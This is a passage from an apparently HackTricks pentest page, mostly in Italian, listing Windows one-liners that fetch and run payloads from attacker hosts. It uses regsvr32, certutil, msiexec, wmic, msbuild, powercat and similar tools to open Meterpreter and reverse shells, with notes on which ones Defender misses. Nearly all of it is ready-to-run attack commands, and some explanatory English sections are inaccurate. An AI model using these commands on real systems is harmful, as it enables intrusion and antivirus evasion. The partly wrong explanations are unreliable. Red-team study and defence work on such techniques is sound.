<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility that is used to register and unregister DLL files. However, it can also be used as a technique for executing malicious code on a target system. In this case, we will explore how to use Regsvr32 with Metasploit to gain remote access to a Windows machine.

##### **Step 1: Generate the Payload**

First, we need to generate a payload using Metasploit. This payload will be executed on the target machine when we run the Regsvr32 command. To generate the payload, open a terminal and enter the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the reverse connection.

##### **Step 2: Set Up the Listener**

Next, we need to set up a listener in Metasploit to receive the reverse connection from the target machine. Open Metasploit by entering `msfconsole` in the terminal. Once Metasploit is open, enter the following command to set up the listener:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit
```

Again, replace `<attacker IP>` and `<attacker port>` with your IP address and the port you specified in Step 1.

##### **Step 3: Execute the Payload**

Now that the payload and listener are set up, we can execute the payload on the target machine using the Regsvr32 command. Open a command prompt on the target machine and enter the following command:

```
regsvr32 /s /n /u /i:<payload.dll> scrobj.dll
```

Replace `<payload.dll>` with the path to the payload file generated in Step 1.

Once the command is executed, the payload will be executed on the target machine and a reverse connection will be established with your machine. You will now have remote access to the target machine through Metasploit.

##### **Conclusion**

Using Regsvr32 with Metasploit can be an effective technique for gaining remote access to a Windows machine. However, it is important to note that this technique relies on social engineering or exploiting vulnerabilities to trick the user into executing the malicious command. It is essential to use this technique responsibly and only on systems that you have proper authorization to access.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**È possibile scaricare ed eseguire facilmente uno zombie Koadic utilizzando lo stager regsvr**

## Certutil

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Scarica un B64dll, decodificalo ed eseguilo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Scarica un file B64exe, decodificalo ed eseguilo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Rilevato da Defender**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità più importanti in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload delivery method. By creating a malicious script and using Cscript to execute it, an attacker can gain remote access to a compromised Windows system.

To use Cscript with Metasploit, follow these steps:

1. Generate a malicious script using a Metasploit payload. For example, you can use the `msfvenom` tool to create a payload in VBScript format:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f vbscript -o payload.vbs
```

2. Transfer the generated script (`payload.vbs`) to the target Windows system. This can be done using various methods, such as email, file sharing, or exploiting vulnerabilities in other software.

3. On the target system, open a command prompt and navigate to the directory where the script is located.

4. Execute the script using Cscript:
```
cscript payload.vbs
```

5. If successful, the script will establish a connection back to the attacker's machine, providing a remote shell with Metasploit's Meterpreter payload.

It is important to note that using Cscript as a payload delivery method may trigger antivirus or security software detections. To bypass these detections, attackers often employ techniques such as obfuscation or encryption to make the script appear benign.

By leveraging the power of Cscript and Metasploit, attackers can exploit vulnerabilities in Windows systems and gain unauthorized access. It is crucial for system administrators and security professionals to be aware of these techniques in order to protect against such attacks.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Rilevato da Defender**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Processo che effettua una chiamata di rete: **svchost.exe**\
Payload scritto su disco: **cache locale del client WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Rilevato da Defender**

## **MSIExec**

Attaccante
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Vittima:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Rilevato**

## **Wmic**

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Esempio di file xsl [da qui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Non rilevato**

**È possibile scaricare ed eseguire facilmente uno zombie Koadic utilizzando lo stager wmic**

## Msbuild

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Puoi utilizzare questa tecnica per eludere la lista bianca delle applicazioni e le restrizioni di Powershell.exe. Verrai richiesto di eseguire una shell PS.\
Basta scaricare questo file ed eseguirlo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Non rilevato**

## **CSC**

Compila il codice C# nella macchina vittima.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Puoi scaricare una shell inversa di base in C# da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Non rilevato**

## **Regasm/Regsvc**

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Non l'ho provato**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Non l'ho provato**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells di Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Nella cartella **Shells**, ci sono molti tipi di shell differenti. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_, fai una copia dello script e aggiungi alla fine del file:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Inizia a servire lo script su un server web ed eseguilo sul dispositivo della vittima:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender non lo rileva come codice maligno (ancora, 3/04/2019).

**TODO: Controllare altre shell di nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Scarica, avvia un server web, avvia il listener ed eseguilo sul computer della vittima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender non lo rileva come codice maligno (ancora, 3/04/2019).

**Altre opzioni offerte da powercat:**

Shell di bind, Shell inversa (TCP, UDP, DNS), Reindirizzamento di porta, Caricamento/scaricamento, Generazione di payload, Servire file...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Crea un lanciatore powershell, salvalo in un file e scaricalo ed eseguilo.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Rilevato come codice maligno**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Crea una versione di powershell di una backdoor di metasploit utilizzando unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Avvia msfconsole con la risorsa creata:
```
msfconsole -r unicorn.rc
```
Avvia un server web che serve il file _powershell\_attack.txt_ e esegui nel computer della vittima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Rilevato come codice maligno**

## Altro

[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS con alcuni moduli PS offensivi precaricati (cifrati)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS con alcuni moduli PS offensivi e rilevamento proxy (IEX)

## Riferimenti

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità più importanti in modo da poterle correggere più velocemente. Intruder monitora la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
